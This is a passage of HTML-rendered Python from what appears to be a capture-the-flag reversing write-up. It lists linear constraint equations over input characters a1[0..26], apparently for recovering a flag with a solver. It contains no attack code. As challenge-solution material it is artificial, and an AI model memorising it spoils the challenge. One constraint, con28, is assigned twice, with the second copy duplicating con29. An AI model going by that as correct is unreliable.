</span></span><span style="display:flex;"><span>con26 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">201846</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">14</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">272550</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">20</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">60398</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">45580</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">7</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">195108</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">11</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">38596</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">220445</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">18</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">190873</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">15</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">103477</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">9</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">118842</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">19</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">206336</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">10</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">249940</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">17</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">48084</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">21</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">104901</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">48576</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">287104</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">16</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">286686</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">30253</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">22</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">121183</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">90967</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">195519</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">12</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">129304</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">8</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">141188</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">13</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">56642147</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>con27 <span style="color:#f92672">=</span> <span style="color:#ae81ff">110609</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">5913</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">21</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">197578</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">7</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">45127</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">18</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">282426</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">13</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">71019</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">16</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">6980</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">11</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">208216</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">15</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">13544</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">20</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">17852</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">8</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">167833</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">12</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">145568</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">17</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">3610</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">19</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">91985</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">267402</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">32355</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">14</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">197823</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">23</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">135525</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">229424</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">22</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">38093</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">10</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">50167</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">118713</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">9</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">123874</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">89499</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">43090537</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>con28 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">164755</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">9</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">175470</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">8</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">28660</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">7217</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">11</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">295102</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">28531</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">19</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">106265</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">25</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">92750</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">10</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">16738</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">21</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">231714</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">172042</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">24</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">215890</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">17</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">199697</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">12</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">84235</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">7</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">44614</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">13</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">75104</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">195843</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">15784</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">14</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">131950</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">15</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">268167</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">16</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">197565</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">20</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">24340</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">23</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">105130</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">79750</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">22</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">264668</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">50329</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">18</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">137774797</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>con28 <span style="color:#f92672">=</span> <span style="color:#ae81ff">62119</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">17</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">17215</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">24</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">289621</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">18</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">53006</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">20</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">95969</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">11</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">202404</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">247060</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">21</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">144211</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">19</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">280106</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">7</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">126431</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">10</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">226837</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">12</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">10463</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">23</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">121257</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">13</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">84190</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">9</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">88917</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">15453</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">14</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">271442</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">110851</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">231422</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">176741</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">22</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">266134</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">197327</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">55225</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">8</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">265465</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">15</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">119612</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">16</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">98514358</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>con29 <span style="color:#f92672">=</span> <span style="color:#ae81ff">62119</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">17</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">17215</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">24</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">289621</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">18</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">53006</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">20</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">95969</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">11</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">202404</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">247060</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">21</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">144211</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">19</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">280106</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">7</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">126431</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">10</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">226837</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">12</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">10463</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">23</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">121257</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">13</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">84190</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">9</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">88917</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">15453</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">14</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">271442</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">110851</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">231422</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">176741</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">22</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">266134</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">197327</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">55225</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">8</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">265465</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">15</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">119612</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">16</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">98514358</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>con30 <span style="color:#f92672">=</span> <span style="color:#ae81ff">151924</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">25</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">265311</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">107604</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">11</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">47851</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">24</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">227178</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">13</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">162699</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">2171</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">20</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">211070</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">23</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">94815</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">22</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">124760</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">16</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">41462</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">19</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">277022</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">15</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">62501</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">26</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">17727</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">14</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">257908</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">4</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">175112</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">21</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">8972</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">10</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">71801</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">8</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">114724</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">5</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">252898</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">9</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">161457</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">64461</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">0</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">111493</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">18</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">200145</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">17</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">290075</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">158466</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">12</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">275262</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">86899519</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>con31 <span style="color:#f92672">=</span> <span style="color:#ae81ff">142850</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">18</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">166704</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">1</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">284852</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">22</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">248972</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">7</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">76200</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">17</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">261708</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">19</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">91911</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">24</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">22347</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">3</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">76006</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">21</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> <span style="color:#ae81ff">256511</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">6</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">100052</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">14</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">115830</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">2</span>]\
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">-</span> <span style="color:#ae81ff">93202</span> <span style="color:#f92672">*</span> a1[<span style="color:#ae81ff">23</span>]\
